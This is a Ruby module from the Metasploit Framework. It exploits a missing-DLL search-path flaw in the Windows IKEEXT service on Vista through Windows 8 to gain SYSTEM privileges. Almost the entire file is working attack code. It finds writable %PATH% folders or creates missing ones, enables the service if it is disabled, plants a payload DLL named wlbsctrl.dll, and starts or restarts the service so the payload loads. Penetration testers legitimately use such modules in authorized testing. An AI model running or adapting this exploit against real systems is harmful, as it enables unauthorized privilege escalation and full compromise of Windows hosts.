##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/services'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Accounts

  def initialize(info={})
    super( update_info( info,
      'Name'     => 'IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) Missing DLL',
      'Description'   => %q{
        This module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring Modules'
        (IKEEXT) service which runs as SYSTEM, and starts automatically in default
        installations of Vista-Win8.
        It requires an insecure bin path to plant the DLL payload.
      },
      'References'   =>
        [
          ['URL', 'https://www.htbridge.com/advisory/HTB23108'],
          ['URL', 'https://www.htbridge.com/vulnerability/uncontrolled-search-path-element.html']
        ],
      'DisclosureDate' => "Oct 09 2012",
      'License'   => MSF_LICENSE,
      'Author'   =>
        [
          'Ben Campbell <eat_meatballs@hotmail.co.uk>'
        ],
      'Platform'   => [ 'win'],
      'Targets'   =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'SessionTypes'   => [ "meterpreter" ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'WfsDelay' => 5,
          'ReverseConnectRetries' => 255
        },
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new("DIR", [ false, "Specify a directory to plant the DLL.", ""])
    ])
    @service_name = 'IKEEXT'
    @load_lib_search_path = [  '%SystemRoot%\\System32',
            '%SystemRoot%\\System',
            '%SystemRoot%'
          ]
    @non_existant_dirs = []
  end

  def check_service_exists?(service)
    srv_info = service_info(service)

    if srv_info.nil?
      print_warning("Unable to enumerate services.")
      return false
    end

    if srv_info && srv_info['Name'].empty?
      print_warning("Service #{service} does not exist.")
      return false
    else
      return true
    end
  end

  def check
    srv_info = service_info(@service_name)

    if !check_service_exists?(@service_name)
      return Exploit::CheckCode::Safe
    end

    vprint_status(srv_info.to_s)

    case srv_info['Startup']
    when 'Disabled'
      print_error("Service startup is Disabled, so will be unable to exploit unless account has correct permissions...")
      return Exploit::CheckCode::Safe
    when 'Manual'
      print_error("Service startup is Manual, so will be unable to exploit unless account has correct permissions...")
      return Exploit::CheckCode::Safe
    when 'Auto'
      print_good("Service is set to Automatically start...")
    end

    if check_search_path
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Vulnerable
  end

  def check_search_path
    dll = 'wlbsctrl.dll'

    @load_lib_search_path.each do |path|
      dll_path = "#{expand_path(path)}\\#{dll}"

      if file_exist?(dll_path)
        print_warning("DLL already exists at #{dll_path}...")
        return true
      end
    end

    return false
  end

  def check_system_path
    print_status("Checking %PATH% folders for write access...")
    result  = registry_getvaldata('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment', 'Path')

    if result.nil?
      print_error("Unable to retrieve %PATH% from registry.")
      return
    end

    paths = result.split(';')
    paths.append(@load_lib_search_path).flatten!.uniq!

    paths.each do |p|
      path = expand_path(p)
      if exist?(path)
        if check_write_access(path)
          return path
        end
      else
        # User may be able to create the path...
        print_status("Path #{path} does not exist...")
        @non_existant_dirs << path
      end
    end

    return nil
  end

  def check_write_access(path)
    perm = check_dir_perms(path, @token)
    if perm and perm.include?('W')
      print_good ("Write permissions in #{path} - #{perm}")
      return true
    elsif perm
      vprint_status ("Permissions for #{path} - #{perm}")
    else
      vprint_status ("No permissions for #{path}")
    end

    return false
  end

  def check_dirs
    print_status("Attempting to create a non-existant PATH dir to use.")
    @non_existant_dirs.each do |dir|
      begin
        client.fs.dir.mkdir(dir)
        if exist?(dir)
          register_file_for_cleanup(dir)
          return dir
        end
      rescue  Rex::Post::Meterpreter::RequestError => e
        vprint_status("Unable to create dir: #{dir} - #{e}")
      end
    end

    return nil
  end

  def check_session_arch
    if sysinfo['Architecture'] =~ /x64/i
      if payload_instance.arch.first == 'x86'
        fail_with(Exploit::Failure::BadConfig, "Wrong Payload Architecture")
      end
    else
      if payload_instance.arch.first =~ /64/i
        fail_with(Exploit::Failure::BadConfig, "Wrong Payload Architecture")
      end
    end
  end

  def exploit
    check_session_arch

    begin
      @token = get_imperstoken
    rescue Rex::Post::Meterpreter::RequestError
      vprint_error("Error while using get_imperstoken: #{e}")
    end

    fail_with(Exploit::Failure::Unknown, "Unable to retrieve token.") unless @token

    if is_system?
      fail_with(Exploit::Failure::Unknown, "Current user is already SYSTEM, aborting.")
    end

    print_status("Checking service exists...")
    if !check_service_exists?(@service_name)
      fail_with(Exploit::Failure::NoTarget, "The service doesn't exist.")
    end

    if is_uac_enabled?
      print_warning("UAC is enabled, may get false negatives on writable folders.")
    end

    if datastore['DIR'].empty?
      # If DLL already exists in system folders, we dont want to overwrite by accident
      if check_search_path
        fail_with(Exploit::Failure::NotVulnerable, "DLL already exists in system folders.")
      end

      file_path = check_system_path
      file_path ||= check_dirs # If no paths are writable check to see if we can create any of the non-existant dirs

      if file_path.nil?
        fail_with(Exploit::Failure::NotVulnerable, "Unable to write to any folders in the PATH, aborting...")
      end
    else
      # Use manually selected Dir
      file_path = datastore['DIR']
    end

    @dll_file_path = "#{file_path}\\wlbsctrl.dll"

    service_information = service_info(@service_name)

    if service_information['Startup'] == 'Disabled'
      print_status("Service is disabled, attempting to enable...")
      service_change_startup(@service_name, 'auto')
      service_information = service_info(@service_name)

      # Still disabled
      if service_information['Startup'] == 'Disabled'
        fail_with(Exploit::Failure::NotVulnerable, "Unable to enable service, aborting...")
      end
    end

    # Check architecture
    dll = generate_payload_dll

    #
    # Drop the malicious executable into the path
    #
    print_status("Writing #{dll.length.to_s} bytes to #{@dll_file_path}...")
    begin
      write_file(@dll_file_path, dll)
      register_file_for_cleanup(@dll_file_path)
    rescue Rex::Post::Meterpreter::RequestError => e
      # Can't write the file, can't go on
      fail_with(Exploit::Failure::Unknown, e.message)
    end

    #
    # Run the service, let the Windows API do the rest
    #
    print_status("Launching service #{@service_name}...")

    begin
      status = service_start(@service_name)
      if status == 1
        print_status("Service already running, attempting to restart...")
        if service_stop(@service_name) == 0
          print_status("Service stopped, attempting to start...")
          if service_start(@service_name) == 0
            print_status("Service started...")
          else
            fail_with(Exploit::Failure::Unknown, "Unable to start service.")
          end
        else
          fail_with(Exploit::Failure::Unknown, "Unable to stop service")
        end
      elsif status == 0
        print_status("Service started...")
      end
    rescue RuntimeError => e
      raise e if e.kind_of? Msf::Exploit::Failed
      if service_information['Startup'] == 'Manual'
        fail_with(Exploit::Failure::Unknown, "Unable to start service, and it does not auto start, cleaning up...")
      else
        if job_id
          print_status("Unable to start service, handler running waiting for a reboot...")
          while(true)
            break if session_created?
            select(nil,nil,nil,1)
          end
        else
          fail_with(Exploit::Failure::Unknown, "Unable to start service, use exploit -j to run as a background job and wait for a reboot...")
        end
      end
    end
  end

end
